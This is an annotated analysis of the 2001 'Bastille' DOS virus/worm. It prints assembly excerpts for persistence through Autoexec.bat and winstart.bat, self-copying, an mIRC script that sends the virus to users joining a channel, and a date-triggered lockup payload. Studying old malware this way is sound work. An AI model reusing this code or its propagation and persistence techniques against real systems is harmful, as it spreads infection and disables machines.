
## Analysis of the Bastille Virus/Worm (DOS Assembly)

**Author:** PetiK
**Date:** 23/04/2001 and 03/06/2001
**Type:** Virus/Worm (combines techniques of both)
**Platform:** DOS (.model small assembly)

This assembly code represents a malicious program that combines characteristics of a virus and a worm. It's written for the DOS environment and utilizes DOS system calls (interrupts `int 21h`) to perform its actions.

### General Structure

The program is structured as a DOS `.COM` program, meaning it's small (less than 64KB) and runs in a single memory segment.

```assembly
.model small
.code
org 100h

DEBUT: jmp START
```
-   `.model small`: Indicates the memory model (small).
-   `.code`: Declares the code segment.
-   `org 100h`: The program starts at offset 100h (256 decimal), which is standard for `.COM` files.
-   `DEBUT: jmp START`: Jumps to the `START` label for the main execution, bypassing initial routines and data.

### Main Functionalities

The Bastille virus/worm has several key functionalities:

1.  **Modification of Autoexec.bat:**

```assembly
OUVRE_AUTO:
    mov ax,3D01h
    lea dx,FILE        ; FILE db 'C:\Autoexec.bat',00h
    int 21h            ; Opens autoexec.bat in read/write mode
    xchg ax,bx          ; Saves the file handle in bx

    xor cx,cx
    mov dx,cx
    mov ax,4202h
    int 21h            ; Moves to the end of the file (append mode)

    mov cx,AUTOL
    lea dx,DAUTO      ; Content to be added
    mov ah,40h
    int 21h            ; Writes the content to autoexec.bat

    mov ah,3Eh
    int 21h            ; Closes the file

    ; ... (modifies file attributes, potentially to make it read-only)
   ``` 
*   It opens `C:\Autoexec.bat`, moves to the end of the file, and appends command lines.  The purpose is to display a message every time the computer starts.

```assembly
DAUTO:     db '',0dh,0ah
       db '@echo off',0dh,0ah
       db 'cls',0dh,0ah
       db 'echo You''re infected by Bastille Virus (c)2001',0dh,0ah
       db 'echo.',0dh,0ah
       db 'echo Don''t panic ! It''s not dangerous, just fatal !!',0dh,0ah
       db 'pause'
AUTOL      equ $-DAUTO
```
2.  **Creation of Winstart.bat:**
    
    Extrait de code
    
    ```
    START:  mov ah,3Ch
        xor cx,cx
        lea dx,WINSTART   ; WINSTART db 'C:\Windows\winstart.bat',00h
        int 21h            ; Creates C:\Windows\winstart.bat
        xchg ax,bx        ; handle in bx
    
        ; ... (writes the content of DWINSTART to the file)
    
    ```
 -   Creates a `C:\Windows\winstart.bat` file. This batch file is executed during the startup of Windows 9x/Me. `assembly DWINSTART db '@echo off',0dh,0ah db 'if exist C:\Data\Win32.com C:\Data\Win32.com' WINSTARTL equ $-DWINSTART`
-   The content of `winstart.bat` is a conditional command that executes the file `C:\Data\Win32.com` (the virus itself) if it exists. This is a simplified form of persistence, but not very robust.

3.  **Self-Replication (Virus Copying):**
    
    ```assembly
    COPIE_VIRUS:
        mov ah,39h
        lea dx,DIR          ; DIR db 'C:\Data',00h
        int 21h            ; Creates the C:\Data directory
    
        mov ah,3Ch
        xor cx,cx
        lea dx,COPIE       ; COPIE db 'C:\Data\Win32.com',00h
        int 21h            ; Creates C:\Data\Win32.com
        xchg ax,bx        ; handle in bx
    
        mov ah,40h
        mov cx,offset VRAIFIN - offset DEBUT  ; Size of the viral code
        lea dx,DEBUT      ; Start address of the viral code
        int 21h            ; Writes the viral code to the file
    
        mov ah,3Eh
        int 21h            ; Closes the file
    
    ```
    
    -   Creates a directory `C:\Data`.
    -   Creates the file `C:\Data\Win32.com`.
    -   Copies the _entire_ virus code (from `DEBUT` to `VRAIFIN`) into `Win32.com`. This is a simple and direct replication technique. The whole virus is copied, not just a part.
4.  **Propagation via mIRC (Worm Behavior):**
    
    ```assembly
    MIRC:   mov ah,3Ch
        xor cx,cx
        lea dx,MIRCF1      ; MIRCF1 db 'C:\script.ini',00h
        int 21h
        xchg ax,bx         ; handle in bx
        ; ... (writes DMIRC to the file)
    
        mov ah,3Eh
        int 21h
    
        ; ... (copies/renames script.ini to the mIRC directory)
    
    DMIRC      db '[script]',0dh,0ah
           db 'n0=on 1:start:{',0dh,0ah
           db 'n1= .sreq ignore',0dh,0ah
           db 'n2=}',0dh,0ah
           db 'n3=on 1:connect:/rename C:\Data\Win32.com C:\Bastille.com',0dh,0ah
           db 'n4=on 1:join:#:{',0dh,0ah
           db 'n5=if ($nick != $me) { dcc send $nick C:\Bastille.com }',0dh,0ah
           db 'n6=}',0dh,0ah
           db 'n7=on 1:disconnect:/rename C:\Bastille.com C:\Data\Win32.com'
    MIRCL      equ $-DMIRC
    
    ```
    
    -   Creates or modifies a `script.ini` file. mIRC, a popular IRC client at the time, would execute scripts contained in this file.
    -   The added script:
        -   `on 1:start:{ .sreq ignore }`: Temporarily disables file requests (to prevent an infinite loop).
        -   `on 1:connect:/rename C:\Data\Win32.com C:\Bastille.com`: When the mIRC client connects, it renames the virus copy. This is so the copy sent via DCC has a different name.
        -   `on 1:join:#:{ if ($nick != $me) { dcc send $nick C:\Bastille.com } }`: When a user joins a channel, the script sends the `C:\Bastille.com` file (the renamed copy of the virus) via DCC (Direct Client-to-Client) to that user.
        -   `on 1:disconnect:/rename C:\Bastille.com C:\Data\Win32.com`: On disconnect, the file is renamed back to its original name.
    -   Copies/renames `script.ini` to the `C:\mirc` directory, if it exists. If the directory doesn't exist, this part fails, but the rest of the virus continues.
5.  **Payload - Date Triggered:**
    
    ```assembly
    DATE:   mov ah,2Ah
        int 21h            ; Gets the system date (year in cx, month in dh, day in dl)
        cmp dh,7
        jnz FIN           ; If the month is not July, jump to the end
        cmp dl,14
        jnz FIN           ; If the day is not the 14th, jump to the end
    
    FEU:    mov ah,9
        lea dx,MSG
        int 21h            ; Displays the message MSG
        cli               ; Disables interrupts
        jmp $             ; Infinite loop
    
    ```
    
    -   Checks the system date.
    -   If the date is July 14th, the payload is activated.
    -   The payload displays a message, then locks the computer in an infinite loop (`jmp $`) after disabling interrupts (`cli`). This makes the system unusable and requires a reboot. The message in `MSG` tells the user to wait until tomorrow.
      
    ```assembly
    MSG    db 7,7,7,10,13,'YOUR COMPUTER IS FOR THE MOMENT DEAD',0dh,0ah
        db 'WAIT TOMORROW TO RESTART YOUR COMPUTER',0dh,0ah,0dh,0ah
        db '         PetiK (c)2001 $'
    
    ```
    
6.  Termination
    
    ```assembly
    FIN:    mov ah,4Ch
        int 21h            ; Terminates the program (returns to DOS)
    
    ```
    

### Important Points and Techniques Used

-   **DOS System Calls (`int 21h`):** The code heavily uses the `int 21h` interrupt to interact with the DOS operating system. This is the standard method for performing file, directory, display, etc., operations under DOS.
-   **File Manipulation:** The virus opens, creates, writes to, and closes files. It uses the classic DOS functions for this (3Ch to create, 40h to write, 3Eh to close, etc.).
-   **Directory Manipulation:** It creates a directory (`C:\Data`) using `int 21h` function `39h`.
-   **Direct Replication:** The virus copy is a complete replication of the code, which makes the virus larger but simple to implement.
-   **Propagation via IRC:** The use of mIRC for propagation is a classic worm technique.
-   **Persistence:** The modifications to `autoexec.bat` and `winstart.bat` provide some persistence (the virus runs on every startup) but are easily bypassed.
-   **Date-Triggered Payload:** The trigger on July 14th is a nod to the French national holiday (Bastille Day). The payload is destructive (system lockup).
-   **Absence of Stealth:** It makes no serious attempt to hide itself. The code is not encrypted or obfuscated, and the file and directory names are explicit.

### Conclusion

The "Bastille" code is an interesting example of malware combining aspects of a virus and a worm. It demonstrates basic assembly programming techniques for DOS, file and directory manipulation, replication, propagation via third-party applications (mIRC), and payload activation. Although relatively simple compared to modern malware, it clearly illustrates the fundamental principles of malicious code creation. Its lack of stealth and destructive payload make it easily detectable and potentially very annoying for an unsuspecting user.
